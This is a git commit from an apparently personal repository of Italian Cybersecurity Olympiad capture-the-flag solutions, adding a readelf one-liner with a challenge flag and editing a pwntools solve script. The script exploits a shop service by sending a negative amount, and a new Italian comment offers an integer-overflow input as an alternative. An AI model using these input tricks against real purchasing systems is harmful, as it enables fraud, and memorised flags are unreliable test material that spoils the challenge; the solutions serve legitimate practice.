2a258cf8909f717b7b3088d898e558167af02258
Zamv00 <mappingfire052@gmail.com>
2025-10-14 19:27:40 +0200

    Solved✅

---
+++ Olimpiadi Italiane di Cybersecurity/Binary/hidden_variable writeup.md
@@ -0,0 +1,3 @@
+``` readelf -x .data ./hidden_variable | less ```
+
+**flag{unu53d_v4r5_4r3_5711_c0mp1l3d}**
--- Olimpiadi Italiane di Cybersecurity/Binary/supermarket_solve.py
+++ Olimpiadi Italiane di Cybersecurity/Binary/supermarket_solve.py
@@ -8,7 +8,7 @@ r = remote(host,port)
 r.sendlineafter(b'> ', b'3')    
 r.sendlineafter(b'> ', b'-1') 
 # cost = ps[choice-1].price * amount; se * -1 permette di acquistare nonostante il saldo non sia sufficiente
-
+# un'altra soluzione è mandare per esempio 21474836471 che fa integer overflow
 flag = r.recvline().decode().strip()
 print(flag)
 
